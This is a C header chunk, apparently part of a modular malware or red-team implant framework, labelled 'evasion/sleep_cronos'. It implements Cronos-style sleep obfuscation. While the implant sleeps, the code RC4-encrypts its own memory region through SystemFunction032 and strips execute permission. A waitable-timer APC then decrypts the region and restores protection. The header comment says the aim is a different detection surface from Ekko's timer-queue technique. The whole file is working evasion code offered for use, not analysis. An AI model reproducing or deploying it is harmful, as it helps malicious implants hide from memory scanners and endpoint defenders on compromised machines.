// chunk: evasion/sleep_cronos
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: low
// note: Cronos-style sleep obfuscation — uses waitable timers (CreateWaitableTimerA + SetWaitableTimer) with completion APC callback instead of timer queues. Timer fires after sleep duration, APC decrypts + restores protection. Different detection surface from Ekko's CreateTimerQueueTimer.

#ifndef CHUNK_SLEEP_CRONOS
#define CHUNK_SLEEP_CRONOS

typedef struct _CRONOS_BLOB {
    ULONG Length;
    ULONG MaximumLength;
    PUCHAR Buffer;
} CRONOS_BLOB;

typedef NTSTATUS (NTAPI *pfnSystemFunction032_cro)(
    CRONOS_BLOB *data,
    CRONOS_BLOB *key
);

static volatile int g_cronos_initialized = 0;
static pfnSystemFunction032_cro g_cronos_SF032 = NULL;

static int cronos_init(void) {
    if (g_cronos_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    g_cronos_SF032 = (pfnSystemFunction032_cro)GetProcAddress(advapi, "SystemFunction032");
    if (!g_cronos_SF032) return 0;

    g_cronos_initialized = 1;
    return 1;
}

static void cronos_crypt(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    CRONOS_BLOB data_blob;
    CRONOS_BLOB key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_cronos_SF032(&data_blob, &key_blob);
}

typedef struct {
    BYTE *base;
    DWORD size;
    BYTE key[16];
    DWORD old_protect;
    HANDLE done_event;
} cronos_ctx_t;

// Timer completion APC — fires after sleep duration in alertable wait
static void CALLBACK cronos_timer_apc(LPVOID arg, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
    (void)dwTimerLowValue; (void)dwTimerHighValue;
    cronos_ctx_t *ctx = (cronos_ctx_t *)arg;

    // Decrypt the region (RC4 is symmetric — same call decrypts)
    cronos_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

    // Restore original protection (RX)
    DWORD dummy;
    VirtualProtect(ctx->base, ctx->size, ctx->old_protect, &dummy);

    // Signal main thread that restore is complete
    SetEvent(ctx->done_event);
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_cronos_initialized && !cronos_init()) {
        Sleep(ms);
        return;
    }

    cronos_ctx_t ctx;
    ctx.base = base;
    ctx.size = size;
    ctx.done_event = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx.done_event) { Sleep(ms); return; }

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        ctx.key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0xA3 + 0x17));

    // Create waitable timer
    HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    if (!hTimer) {
        CloseHandle(ctx.done_event);
        Sleep(ms);
        return;
    }

    // Encrypt the region
    cronos_crypt(base, size, ctx.key, sizeof(ctx.key));

    // Remove execute permission — memory is encrypted non-executable garbage
    VirtualProtect(base, size, PAGE_READWRITE, &ctx.old_protect);

    // Set waitable timer — fires after ms milliseconds, queues our APC
    LARGE_INTEGER due_time;
    due_time.QuadPart = -((LONGLONG)ms * 10000);

    if (!SetWaitableTimer(hTimer, &due_time, 0, cronos_timer_apc, &ctx, FALSE)) {
        // Failed — undo everything
        DWORD dummy;
        VirtualProtect(base, size, ctx.old_protect, &dummy);
        cronos_crypt(base, size, ctx.key, sizeof(ctx.key));
        CloseHandle(hTimer);
        CloseHandle(ctx.done_event);
        Sleep(ms);
        return;
    }

    // Enter alertable wait — the timer APC fires when duration elapses
    SleepEx(ms + 5000, TRUE);

    // Wait for completion signal from APC
    WaitForSingleObject(ctx.done_event, 5000);

    CloseHandle(hTimer);
    CloseHandle(ctx.done_event);
    SecureZeroMemory(ctx.key, sizeof(ctx.key));
}

#endif
